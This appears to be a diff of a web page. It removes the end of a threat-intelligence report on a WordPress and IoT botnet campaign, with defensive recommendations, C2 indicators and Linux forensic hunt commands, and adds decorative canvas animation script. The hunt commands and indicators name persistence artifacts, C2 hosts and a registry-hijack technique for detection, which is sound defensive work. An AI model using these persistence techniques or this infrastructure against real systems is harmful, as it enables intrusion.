-    <tr><td><span class="pill" style="background:rgba(59,130,246,.12);color:#93c5fd;border:1px solid rgba(59,130,246,.22);">REGKEY</span></td><td class="mono" style="font-size:9px;">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\*\Debugger</td><td>Windows</td><td>IFEO hijack — agent injected as debugger for target process</td></tr>
-  </tbody>
-</table>
-</div>
-
-<!-- 11 RECOMMENDATIONS -->
-
-<h2 id="recommendations">11. Defensive Recommendations</h2>
-
-<h3>Immediate Actions</h3>
-<div class="tbl-wrap">
-<table>
-  <thead><tr><th>Priority</th><th>Action</th><th>Target</th></tr></thead>
-  <tbody>
-    <tr><td><span class="pill p-red">CRITICAL</span></td><td>Update WordPress to 7.0.2 or 6.9.5 — patches CVE-2026-63030 (route-confusion SQLi) and CVE-2026-60137 (zero-credential admin creation)</td><td>All WordPress 6.9.0–7.0.1 installations</td></tr>
-    <tr><td><span class="pill p-red">CRITICAL</span></td><td>Block <code>/wp-json/batch/v1</code> and <code>?rest_route=/batch/v1</code> at WAF; block unauthenticated <code>POST /wp/v2/users</code> until patched</td><td>WAF / CDN / edge</td></tr>
-    <tr><td><span class="pill p-red">CRITICAL</span></td><td>Patch Ubiquiti UniFi Network Application (CVE-2021-36260)</td><td>All UniFi controllers</td></tr>
-    <tr><td><span class="pill p-red">CRITICAL</span></td><td>Block staging server, 202.61.136.40, and 43.161.245.209 (C2 infrastructure) at perimeter</td><td>Firewall</td></tr>
-    <tr><td><span class="pill p-orange">HIGH</span></td><td>Block DNS resolution of <code>v9g6.my</code></td><td>Internal DNS resolvers</td></tr>
-    <tr><td><span class="pill p-orange">HIGH</span></td><td>Search for <code>cache-mgr.service</code>, <code>uniFi-core.service</code>, <code>S99dbusd</code> on all Linux hosts</td><td>Linux endpoints, IoT</td></tr>
-    <tr><td><span class="pill p-orange">HIGH</span></td><td>Audit for <code>wp2_</code>-prefixed WordPress admin accounts</td><td>WordPress admin panels</td></tr>
-  </tbody>
-</table>
-</div>
-
-<h3>Forensic Hunt Commands</h3>
-<pre><code><span class="muted"># Linux — binary and persistence artifacts</span>
-find /tmp /usr/local/bin -name <span class="st">".cache-mgr"</span> -o -name <span class="st">".uniFi-core"</span> -o -name <span class="st">"dbusd"</span> 2>/dev/null
-stat /tmp/.cache-mgr.log 2>/dev/null
-systemctl status cache-mgr uniFi-core syslog-ng 2>/dev/null
-crontab -l 2>/dev/null | grep -E <span class="st">"cache-mgr|uniFi|dbusd|beacon"</span>
-find /etc/systemd/system /etc/init.d -name <span class="st">"cache-mgr"</span> -o -name <span class="st">"uniFi-core"</span> -o -name <span class="st">"S99dbusd"</span>
-grep -r <span class="st">"[STAGING-IP]"</span> /etc/ /root/.bashrc /etc/profile 2>/dev/null
-
-<span class="muted"># Check for MemfdCreate artifacts (process-level, no disk file)</span>
-ls -la /proc/*/fd/ 2>/dev/null | grep <span class="st">"memfd"</span>
-
-<span class="muted"># WordPress admin audit</span>
-wp user list --role=administrator --fields=user_login,user_email 2>/dev/null | grep <span class="st">"wp2_\|wp2shell"</span></code></pre>
-
-</article>
-
-<!-- SIDEBAR -->
-<aside>
-  <div class="sidebar-block">
-    <h4>Contents</h4>
-    <ul class="toc">
-      <li><a href="#findings">00 Key Findings</a></li>
-      <li><a href="#overview">01 Executive Overview</a></li>
-      <li><a href="#infrastructure">02 Infrastructure</a></li>
-      <li><a href="#wordpress">03 WordPress RCE</a></li>
-      <li><a href="#iot">04 IoT Botnet</a></li>
-      <li><a href="#binary">05 Binary Analysis</a></li>
-      <li><a href="#chain">06 Attack Chain</a></li>
-      <li><a href="#geo">07 Geographic Targeting</a></li>
-      <li><a href="#mitre">08 ATT&amp;CK</a></li>
-      <li><a href="#detection">09 Detection</a></li>
-      <li><a href="#ioc">10 IOC</a></li>
-      <li><a href="#recommendations">11 Recommendations</a></li>
-    </ul>
-  </div>
-</aside>
-
-</div>
-</div>
-
-<footer>
-  <div class="footer-inner">
-    <div class="footer-body">
-      This report was produced from an attacker-controlled open directory discovered during continuous monitoring operations. Binary analysis conducted on unpacked agents recovered from the discovery. Victim data redacted. All network indicators remain active as of report date.
-    </div>
-    <div class="footer-meta">
-      <div>TLP:AMBER</div>
-      <div>2026-07-22</div>
-      <div>Agent-TCP / wp2shell</div>
-    </div>
-  </div>
-</footer>
+</section>
 
 <script>
-(function(){
-  var tocLinks = Array.from(document.querySelectorAll('.toc a'));
-  var sections = tocLinks.map(function(a){
-    var id = a.getAttribute('href').substring(1);
-    return {el: document.getElementById(id), link: a};
-  }).filter(function(s){return s.el;});
+    // ── Hex Grid ──────────────────────────────────────────
+    (function() {
+        const svg = document.getElementById('hex-bg');
+        const W = 1400, H = 900, R = 28;
+        const w = R * Math.sqrt(3), h = R * 2;
+        const cols = Math.ceil(W / w) + 2;
+        const rows = Math.ceil(H / (h * 0.75)) + 2;
+        let d = '';
+        for (let r = 0; r < rows; r++) {
+            for (let c = 0; c < cols; c++) {
+                const cx = c * w + (r % 2 === 0 ? 0 : w / 2) - w / 2;
+                const cy = r * h * 0.75 - h / 2;
+                const pts = [];
+                for (let i = 0; i < 6; i++) {
+                    const a = Math.PI / 180 * (60 * i - 30);
+                    pts.push(`${(cx + R * Math.cos(a)).toFixed(1)},${(cy + R * Math.sin(a)).toFixed(1)}`);
+                }
+                d += `<polygon points="${pts.join(' ')}" fill="none" stroke="#FF1A1A" stroke-width="0.6"/>`;
+            }
+        }
+        svg.innerHTML = d;
+    })();
 
-  function update(){
-    var active = null;
-    var threshold = window.innerHeight * 0.35;
-    for(var i=0;i<sections.length;i++){
-      var rect = sections[i].el.getBoundingClientRect();
-      if(rect.top < threshold) active = sections[i];
-    }
-    tocLinks.forEach(function(a){a.classList.remove('toc-active');});
-    var navAs = document.querySelectorAll('.nav-links a');
-    navAs.forEach(function(a){a.classList.remove('active');});
-    if(active){
-      active.link.classList.add('toc-active');
-      var href = active.link.getAttribute('href');
-      document.querySelectorAll('.nav-links a[href="'+href+'"]').forEach(function(a){a.classList.add('active');});
-    }
-  }
-  window.addEventListener('scroll', update, {passive:true});
-  update();
-})();
+    // ── Particles ─────────────────────────────────────────
+    (function() {
+        const canvas = document.getElementById('fx');
+        const ctx = canvas.getContext('2d');
+
+        function resize() {
+            canvas.width  = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resize();
+        window.addEventListener('resize', resize);
+
+        const COUNT = 130;
+        const pts = Array.from({ length: COUNT }, () => ({
+            x:     Math.random() * window.innerWidth,
+            y:     Math.random() * window.innerHeight,
+            r:     Math.random() * 1.8 + 0.5,
+            vx:    (Math.random() - 0.5) * 0.3,
+            vy:    -(Math.random() * 0.5 + 0.12),
+            base:  Math.random() * 0.35 + 0.12,
+            phase: Math.random() * Math.PI * 2,
+        }));
+
+        function loop() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            pts.forEach(p => {
+                p.phase += 0.018;
+                p.x += p.vx + Math.sin(p.phase * 0.7) * 0.15;
+                p.y += p.vy;
+                if (p.y < -4) { p.y = canvas.height + 4; p.x = Math.random() * canvas.width; }
+                if (p.x < -4) p.x = canvas.width  + 4;
+                if (p.x > canvas.width + 4) p.x = -4;
+                const a = p.base * (0.7 + 0.3 * Math.sin(p.phase));
+                ctx.beginPath();
+                ctx.arc(p.x, p.y, p.r, 0, Math.PI * 2);
+                ctx.fillStyle = `rgba(220,228,240,${a})`;
+                ctx.fill();
+            });
+            requestAnimationFrame(loop);
+        }
+        loop();
+    })();
 </script>
-
 </body>
 </html>
